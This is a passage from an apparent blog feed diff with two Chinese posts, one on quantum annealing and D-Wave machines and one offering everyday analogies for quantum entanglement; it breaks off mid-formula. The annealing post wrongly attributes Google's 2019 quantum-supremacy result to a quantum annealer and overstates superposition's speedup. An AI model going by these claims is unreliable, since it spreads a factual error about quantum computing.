+<p>在模拟退火计算收敛的过程中，经常会遇到一些非常高但很薄的势垒，如下图所示：</p>
+<img src="/archives/8/quantum_002.jpeg" class="" title="高势垒">
+<p>对于模拟退火算法，只能像图中的红色箭头一样，需要增大概率（即增加温度，增加能量），来使其到达山顶，之后有需要花大量的时间来收敛（即降温）。</p>
+<p>而对于量子退火算法，就有一定的概率可以像图中的蓝色箭头一样，直接出现在势垒的另一边。</p>
+<p>这种情况下量子退火相比模拟退火具有明显的优越性。</p>
+<h3 id="从实例的角度说明量子退火的优越性"><a class="markdownIt-Anchor" href="#从实例的角度说明量子退火的优越性"></a> 从实例的角度说明量子退火的优越性</h3>
+<p>这里使用爬山算法（贪心算法的一种）的例子来说明。</p>
+<p>爬山算法指的是以以一个任意值为起始点，计算临近的解，然后不断判断这个解和符合条件的差距，选择选择更适合的方向继续计算，直到达到一个任意方向都是更劣解的位置。</p>
+<img src="/archives/8/quantum_003.jpeg" class="" title="爬山算法">
+<p>假设图中蓝线的位置就是要求的解，初始点产生在 DE 段。</p>
+<p>如果采用模拟退火算法，从初始点的左右近邻点来看，E 点是局部最优解。想要获得比 E 更优的解，就必须增大扰动，扩大近邻点的范围。但想从 E 点爬出来并找到更优解依然是一个不容易的过程。特别是假如好不容易找到了更优解 C，则要找到全局最优解就变得难上加难。</p>
+<p>而如果采用量子退火算法，效果如下所示：</p>
+<img src="/archives/8/quantum_004.jpeg" class="" title="量子退火求解爬山算法">
+<p>此时这位攀登者并不是处于 DE 的某一点，而是其波函数所辐射的这一片区域。这位攀登者有一定概率直接出现在 CD 并找到更优解 C，也有一定几率能出现在 FG 上并找到全局最优解之一。同时，因为量子的叠加性质，量子计算元件可以同时处在图中的很多个位置。这样以来，搜索的效率可以以 2 的指数倍增长。</p>
+<p>这种情况下量子退火相比模拟退火具有明显的优越性。</p>
+<h2 id="实现量子退火"><a class="markdownIt-Anchor" href="#实现量子退火"></a> 实现量子退火</h2>
+<p>量子退火算法已经在经典计算机上模拟过了，也生产出了能运行量子退火算法的 D-Wave 量子退火机。</p>
+<h3 id="在经典计算机上模拟"><a class="markdownIt-Anchor" href="#在经典计算机上模拟"></a> 在经典计算机上模拟</h3>
+<p>量子退火算法在经典计算机上模拟主要使用蒙特卡罗方法。</p>
+<div class="note info"><p>蒙特卡罗方法（Monte Carlo method），也称统计模拟方法，是一种使用随机数（或更常见的伪随机数）来解决很多计算问题的方法。</p>
+</div>
+<h3 id="物理上实现量子退火机"><a class="markdownIt-Anchor" href="#物理上实现量子退火机"></a> 物理上实现量子退火机</h3>
+<p>通过蒙特卡罗方法模拟量子退火是非常低效的。研究人员认为其只有在量子计算机上才能表现出优势。</p>
+<h4 id="量子比特"><a class="markdownIt-Anchor" href="#量子比特"></a> 量子比特</h4>
+<p>量子退火机上的量子比特实际上是一个超导环，如下图左所示。其上有电流流动。电流流动带来磁效应，自旋向上（逻辑态 1）和自旋向下（逻辑态 -1），由电流顺逆流动来决定。磁悬可以被设计成量子力学的叠加态，所以可以作为量子比特。</p>
+<img src="/archives/8/quantum_bit.png" class="" title="量子比特">
+<p>实际上的量子比特如上图右所示，每两个线圈的交点都是一个量子比特，8 个通电线圈组成了 16 个量子比特。</p>
+<h4 id="d-wave"><a class="markdownIt-Anchor" href="#d-wave"></a> D-Wave</h4>
+<p>由于 D-Wave 量子计算机只能用来运行量子退火算法，业界对于这种非通用性的计算机是否属于量子计算机仍有争议。所以把 D-Wave 计算机成为量子退火机可能更为合适。</p>
+<img src="/archives/8/dwave.jpeg" class="" title="量子退火机">
+<p>量子退火机上的量子退火处理器：</p>
+<img src="/archives/8/dwave_cpu.png" class="" title="量子退火处理器">
+<h4 id="实际应用"><a class="markdownIt-Anchor" href="#实际应用"></a> 实际应用</h4>
+<p>量子退火机已经被尝试性地用于某些领域，比如：</p>
+<ul>
+<li>自来水管道优化问题，用来避免水压局部过高过低，降低管道整体费用等</li>
+<li>用来研究怎么降低放射性疗法对人体的损害</li>
+<li>NASA 用来优化星际旅行路径</li>
+</ul>
+<h4 id="关于两个重要争论"><a class="markdownIt-Anchor" href="#关于两个重要争论"></a> 关于两个重要争论</h4>
+<p>科学家们围绕量子退火机有两个比较重要的争论。</p>
+<h5 id="是不是真正在利用量子效应在做计算"><a class="markdownIt-Anchor" href="#是不是真正在利用量子效应在做计算"></a> 是不是真正在利用量子效应在做计算</h5>
+<p>2014 年，Google 的一个实验室做了一个实验，使用 D-Wave 量子退火机来求解寻找伊辛模型的基态问题。</p>
+<img src="/archives/8/quantum_005.png" class="" title="是不是真正在利用量子效应在做计算">
+<p>实验发现，D-Wave 量子退火机的行为模式和模拟量子退火的行为模式高度接近，拟合程度很高。而和模拟退火相比，差别非常远，拟合程度很低。所以 Google 该团队认为量子退火机是真正在利用量子效应在做计算的。</p>
+<h5 id="量子退火机上的量子退火有没有实现量子优势"><a class="markdownIt-Anchor" href="#量子退火机上的量子退火有没有实现量子优势"></a> 量子退火机上的量子退火有没有实现量子优势</h5>
+<div class="note info"><p>量子霸权（Quantum Supremacy），或称量子优越性，是指用量子计算机解决经典电脑实际上解决不了的问题，问题本身未必需要有实际应用。</p>
+<p>量子优势（Quantum Advantage）则是指量子电脑在解决实务问题上能比经典电脑更快而带来的优势，从计算复杂性理论的角度来说，这通常代表量子电脑相对最佳经典算法的加速是超多项式的。</p>
+</div>
+<p>2016 年，Google 另一个实验室做了一个实验，同样是一个寻找基态的问题。但是这个问题有点特殊，其能量情况比较复杂，尤其适合使用量子退火算法来解决。</p>
+<p>如下图所示，Google 对比了 D-Wave 量子退火机和蒙特卡罗方法模拟量子退火，发现量子退火机的量子退火实现了量子优势。</p>
+<img src="/archives/8/quantum_better.png" class="" title="量子优势">
+<p>比如，对于 945 个变量的情况，1000 个量子比特的量子退火机的性能是运行在单核处理器上的模拟量子退火算法性能的 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>1</mn><msup><mn>0</mn><mn>8</mn></msup></mrow><annotation encoding="application/x-tex">10^8</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">8</span></span></span></span></span></span></span></span></span></span></span> 倍。</p>
+<p>不过有科学家提出质疑：</p>
+<ul>
+<li>认为量子退火机应该和经典超级计算机相比，而不是和一台单核计算机相比</li>
+<li>认为 Google 不能只拿适合量子退火解决的问题来实验，也应该尝试一些更普遍的问题来验证量子优势</li>
+<li>对于很多经典的组合优化问题，已经有了不少的经典优化算法，量子退火机和这些优化后的经典算法相比效果如何</li>
+</ul>
+<p>2019 年，Google 宣称量子霸权已经实现：在世界第一超算 Summit 需要计算 1 万年的实验中，谷歌的量子退火机只用了 3 分 20 秒。</p>
+<p>这在知乎引发了许多讨论：<a href="https://www.zhihu.com/question/346999432">知乎：如何评价 Google 宣称率先实现量子霸权</a></p>
+<h1 id="总结"><a class="markdownIt-Anchor" href="#总结"></a> 总结</h1>
+<p>本文沿着【为什么需要引入量子退火算法 ➡️ 量子退火算法的简单原理和优势 ➡️ 量子退火算法的物理实现】的思路，整理一下我这几天对量子退火算法的一些了解。</p>
+<p>总的来说，近几年在 Google 等的大力推动下，量子退火机实现了飞速的发展，并且已于去年宣布实现了量子霸权。但是量子退火只能用于解决某些特定问题，除非能研究出具有量子优势的通用型量子计算机，否则专用型的量子计算机还是很难影响经典计算机的地位。</p>
+<hr />
+<p>参考：</p>
+<ul>
+<li><a href="https://baike.baidu.com/item/%E7%BB%84%E5%90%88%E4%BC%98%E5%8C%96/3314860">百度百科：组合优化</a></li>
+<li><a href="https://zh.wikipedia.org/wiki/%E6%A8%A1%E6%8B%9F%E9%80%80%E7%81%AB">维基百科：模拟退火</a></li>
+<li><a href="https://zh.wikipedia.org/wiki/%E9%87%8F%E5%AD%90%E9%80%80%E7%81%AB">维基百科：量子退火</a></li>
+<li><a href="https://zh.wikipedia.org/wiki/%E9%87%8F%E5%AD%90%E7%A9%BF%E9%9A%A7%E6%95%88%E6%87%89">维基百科：量子隧穿效应</a></li>
+<li><a href="https://zh.wikipedia.org/wiki/%E9%87%8F%E5%AD%90%E9%9C%B8%E6%AC%8A">维基百科：量子霸权</a></li>
+<li><a href="https://www.zhihu.com/question/28171555/answer/39998149">知乎：如何理解量子退火 - Rrupmid Nyche的回答</a></li>
+<li><a href="https://www.zhihu.com/question/26933442/answer/34598726">知乎：如何用 IT 业者能听懂的话介绍量子计算的原理 - Summer Clover的回答</a></li>
+</ul>
+]]></content>
+      <categories>
+        <category>其他</category>
+      </categories>
+      <tags>
+        <tag>量子计算</tag>
+        <tag>量子退火</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>如何粗浅理解量子纠缠</title>
+    <url>/archives/7/</url>
+    <content><![CDATA[<div class="note warning"><p>本人并非量子力学相关专业人士，本文是在我搜集资料和个人理解的基础上整理出来的，仅供参考。</p>
+</div>
+<p>从我的第一感觉来看，量子纠缠是一种反直觉的现象。什么是量子纠缠，我们应该如何理解量子纠缠？这里记录一下我粗浅学习之后的认知。</p>
+<p>先简单交代一下量子力学：</p>
+<div class="note primary"><p>现代物理学基本分为经典物理和量子物理。经典物理的共同特征是什么都是确定的。而在量子尺度，微观的物理对象都具有波动性和粒子性，其位置、动量、能量等在经典物理中确定的量都是不确定的。一个粒子有可能同时坐着飞机和高铁从杭州到达北京，这是经典物理无法解释的现象。</p>
+</div>
+<p>这里分降维通俗理解和物理学上的不严格说明两个方向来理解量子纠缠。</p>
+<h2 id="降维理解量子纠缠"><a class="markdownIt-Anchor" href="#降维理解量子纠缠"></a> 降维理解量子纠缠</h2>
+<p>这里通过两个实际生活中的例子说明。</p>
+<h3 id="例一夫妻生孩子"><a class="markdownIt-Anchor" href="#例一夫妻生孩子"></a> 例一：夫妻生孩子</h3>
+<div class="note default"><p>现在有下列两个事件：</p>
+<ul>
+<li>事件 A ：小红生下了一个孩子</li>
+<li>事件 B ：小明当爸爸了</li>
+</ul>
+</div>
+<p>假如小明和小红是一对夫妻，那么在一般情况下，上面两个事件的<strong>发生时间是不确定的</strong>，两个事件也并<strong>不是独立发生的</strong>。当某一时刻，事件 A 发生了的时候，事件 B 也就发生了。事件的结果只有事件 A、B 都发生或者都没发生这两种可能性。</p>
+<p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>A</mi><mi>B</mi></mrow><annotation encoding="application/x-tex">AB</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault">A</span><span class="mord mathdefault" style="margin-right:0.05017em;">B</span></span></span></span> 与 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi mathvariant="normal">¬</mi><mo stretchy="false">(</mo><mi>A</mi><mi>B</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\neg(AB)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">¬</span><span class="mopen">(</span><span class="mord mathdefault">A</span><span class="mord mathdefault" style="margin-right:0.05017em;">B</span><span class="mclose">)</span></span></span></span> 就构成了<strong>纠缠态</strong>。</p>
+<a id="more"></a>
+<p>值得关注的是，一旦<strong>纠缠形成</strong>，即小明和小红是一对夫妻，那么理论上就算把小明和小红之间的<strong>物理距离无限远</strong>，这种纠缠关系也是存在的。我们只需要得知事件 A 发生了，那么也可以确定事件 B 也一定发生了。</p>
+<p><strong>有几点需要重点说明</strong>：</p>
+<ul>
+<li>该例子关注的是<strong>小红生孩子小明就相应地变成爸爸</strong>这个<strong>对应发生的关系</strong>，而非<strong>因为小红和小明是夫妻所以这个孩子是小明的孩子所以小明当爸爸了</strong>这个<strong>因果关系</strong>。</li>
+<li>当事件 A 发生的那一刻，事件 B 也就发生了，并不需要通过信息的传递来让小明得知“事件 A 发生了”这件事情。客观上来看两个事件是同时发生的。</li>
+<li>有些人会<strong>误以为事件 A 与 B 就构成了纠缠态</strong>，这是错误的。纠缠态应该是指事件 A、B 都发生（<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>A</mi><mi>B</mi></mrow><annotation encoding="application/x-tex">AB</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault">A</span><span class="mord mathdefault" style="margin-right:0.05017em;">B</span></span></span></span>）或者都没发生（<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi mathvariant="normal">¬</mi><mo stretchy="false">(</mo><mi>A</mi><mi>B</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\neg(AB)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">¬</span><span class="mopen">(</span><span class="mord mathdefault">A</span><span class="mord mathdefault" style="margin-right:0.05017em;">B</span><span class="mclose">)</span></span></span></span>）的这两种可能性。</li>
+</ul>
+<h3 id="例二甲乙下棋"><a class="markdownIt-Anchor" href="#例二甲乙下棋"></a> 例二：甲乙下棋</h3>
+<div class="note default"><p>现在有下列两个事件：</p>
+<ul>
+<li>事件 A ：甲下棋赢了</li>
+<li>事件 B ：乙下棋赢了</li>
+</ul>
+</div>
+<p>假如甲和乙纠缠，即甲和乙在下同一盘棋，则结果可能是甲胜乙负或者甲负乙胜。对战结束前是不知道结果的。对战结束时，两个事件就同时被决定了，要么 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi mathvariant="normal">¬</mi><mi>A</mi><mi>B</mi></mrow><annotation encoding="application/x-tex">\neg{A}B</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord">¬</span><span class="mord"><span class="mord mathdefault">A</span></span><span class="mord mathdefault" style="margin-right:0.05017em;">B</span></span></span></span>，要么 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>A</mi><mi mathvariant="normal">¬</mi><mi>B</mi></mrow><annotation encoding="application/x-tex">A\neg{B}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault">A</span><span class="mord">¬</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05017em;">B</span></span></span></span></span>。<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi mathvariant="normal">¬</mi><mi>A</mi><mi>B</mi></mrow><annotation encoding="application/x-tex">\neg{A}B</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord">¬</span><span class="mord"><span class="mord mathdefault">A</span></span><span class="mord mathdefault" style="margin-right:0.05017em;">B</span></span></span></span> 与 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>A</mi><mi mathvariant="normal">¬</mi><mi>B</mi></mrow><annotation encoding="application/x-tex">A\neg{B}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault">A</span><span class="mord">¬</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05017em;">B</span></span></span></span></span> 构成纠缠态。</p>
+<h2 id="物理学上的量子纠缠"><a class="markdownIt-Anchor" href="#物理学上的量子纠缠"></a> 物理学上的量子纠缠</h2>
+<p>在量子物理学中，<a href="https://zh.wikipedia.org/wiki/%E8%87%AA%E6%97%8B">量子自旋</a>是量子的基本性质之一。每个电子的自旋状态可以表示为：</p>
+<p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi mathvariant="normal">∣</mi><mi>ψ</mi><mo stretchy="false">⟩</mo><mo>=</mo><mi>α</mi><mi mathvariant="normal">∣</mi><mn>0</mn><mo stretchy="false">⟩</mo><mo>+</mo><mi>β</mi><mi mathvariant="normal">∣</mi><mn>1</mn><mo stretchy="false">⟩</mo></mrow><annotation encoding="application/x-tex">|\psi\rangle = \alpha|0\rangle + \beta|1\rangle
+</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">∣</span><span class="mord mathdefault" style="margin-right:0.03588em;">ψ</span><span class="mclose">⟩</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.0037em;">α</span><span class="mord">∣</span><span class="mord">0</span><span class="mclose">⟩</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.05278em;">β</span><span class="mord">∣</span><span class="mord">1</span><span class="mclose">⟩</span></span></span></span></span></p>
+<p>其中 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi mathvariant="normal">∣</mi><mn>0</mn><mo stretchy="false">⟩</mo></mrow><annotation encoding="application/x-tex">|0\rangle</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">∣</span><span class="mord">0</span><span class="mclose">⟩</span></span></span></span> 代表自旋向上，<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi mathvariant="normal">∣</mi><mn>1</mn><mo stretchy="false">⟩</mo></mrow><annotation encoding="application/x-tex">|1\rangle</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">∣</span><span class="mord">1</span><span class="mclose">⟩</span></span></span></span> 代表自旋向下，且 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>α</mi></mrow><annotation encoding="application/x-tex">\alpha</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.0037em;">α</span></span></span></span> 与 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>β</mi></mrow><annotation encoding="application/x-tex">\beta</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.05278em;">β</span></span></span></span> 满足：</p>
+<p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi mathvariant="normal">∣</mi><mi>α</mi><msup><mi mathvariant="normal">∣</mi><mn>2</mn></msup><mo>+</mo><mi mathvariant="normal">∣</mi><mi>β</mi><msup><mi mathvariant="normal">∣</mi><mn>2</mn></msup><mo>=</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">|\alpha|^2 + |\beta|^2 = 1
+</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.1141079999999999em;vertical-align:-0.25em;"></span><span class="mord">∣</span><span class="mord mathdefault" style="margin-right:0.0037em;">α</span><span class="mord"><span class="mord">∣</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.1141079999999999em;vertical-align:-0.25em;"></span><span class="mord">∣</span><span class="mord mathdefault" style="margin-right:0.05278em;">β</span><span class="mord"><span class="mord">∣</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span></span></p>
+<p>这是一个<a href="https://zh.wikipedia.org/wiki/%E6%80%81%E5%8F%A0%E5%8A%A0%E5%8E%9F%E7%90%86">量子叠加态</a>。</p>
+<p>在未测量的情况下，一个电子的自旋状态既不是向上，也不是向下，而是处于一种向上与向下的叠加态。</p>
+<p>一旦开始测量，将会得到一个确定的电子自旋的状态，要么向上，要么向下，且各自出现的概率分别为 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi mathvariant="normal">∣</mi><mi>α</mi><msup><mi mathvariant="normal">∣</mi><mn>2</mn></msup></mrow><annotation encoding="application/x-tex">|\alpha|^2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord">∣</span><span class="mord mathdefault" style="margin-right:0.0037em;">α</span><span class="mord"><span class="mord">∣</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span> 与 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi mathvariant="normal">∣</mi><mi>β</mi><msup><mi mathvariant="normal">∣</mi><mn>2</mn></msup></mrow><annotation encoding="application/x-tex">|\beta|^2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord">∣</span><span class="mord mathdefault" style="margin-right:0.05278em;">β</span><span class="mord"><span class="mord">∣</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span>。</p>
+<p>而在有两个粒子的量子体系中，就会有量子纠缠的现象。</p>
+<h3 id="假如两个电子没有纠缠"><a class="markdownIt-Anchor" href="#假如两个电子没有纠缠"></a> 假如两个电子没有纠缠</h3>
+<p>假设有两个没有纠缠的电子，两个电子的自旋状态可以表示为：</p>
+<p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mtable rowspacing="0.24999999999999992em" columnalign="right left" columnspacing="0em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mi mathvariant="normal">∣</mi><mi>ψ</mi><mo stretchy="false">⟩</mo><mo>=</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo stretchy="false">(</mo><msub><mi>α</mi><mn>1</mn></msub><mi mathvariant="normal">∣</mi><mn>0</mn><msub><mo stretchy="false">⟩</mo><mn>1</mn></msub><mo>+</mo><msub><mi>β</mi><mn>1</mn></msub><mi mathvariant="normal">∣</mi><mn>1</mn><msub><mo stretchy="false">⟩</mo><mn>1</mn></msub><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>⨂</mo><mo stretchy="false">(</mo><msub><mi>α</mi><mn>2</mn></msub><mi mathvariant="normal">∣</mi><mn>0</mn><msub><mo stretchy="false">⟩</mo><mn>2</mn></msub><mo>+</mo><msub><mi>β</mi><mn>2</mn></msub><mi mathvariant="normal">∣</mi><mn>1</mn><msub><mo stretchy="false">⟩</mo><mn>2</mn></msub><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr></mtable><annotation encoding="application/x-tex">\begin{aligned}
+|\psi\rangle = &amp; (\alpha_1|0\rangle_1 + \beta_1|1\rangle_1) \\
+&amp; \bigotimes (\alpha_2|0\rangle_2 + \beta_2|1\rangle_2)
+\end{aligned}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:3.40001em;vertical-align:-1.4500049999999998em;"></span><span class="mord"><span class="mtable"><span class="col-align-r"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.9500050000000002em;"><span style="top:-4.160005em;"><span class="pstrut" style="height:3.05em;"></span><span class="mord"><span class="mord">∣</span><span class="mord mathdefault" style="margin-right:0.03588em;">ψ</span><span class="mclose">⟩</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span></span></span><span style="top:-2.450005em;"><span class="pstrut" style="height:3.05em;"></span><span class="mord"></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.4500049999999998em;"><span></span></span></span></span></span><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.9500050000000002em;"><span style="top:-4.160005em;"><span class="pstrut" style="height:3.05em;"></span><span class="mord"><span class="mord"></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.0037em;">α</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.0037em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">∣</span><span class="mord">0</span><span class="mclose"><span class="mclose">⟩</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05278em;">β</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.05278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">∣</span><span class="mord">1</span><span class="mclose"><span class="mclose">⟩</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span><span style="top:-2.450005em;"><span class="pstrut" style="height:3.05em;"></span><span class="mord"><span class="mord"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop op-symbol large-op" style="position:relative;top:-0.000004999999999977245em;">⨂</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.0037em;">α</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.0037em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">∣</span><span class="mord">0</span><span class="mclose"><span class="mclose">⟩</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05278em;">β</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.05278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">∣</span><span class="mord">1</span><span class="mclose"><span 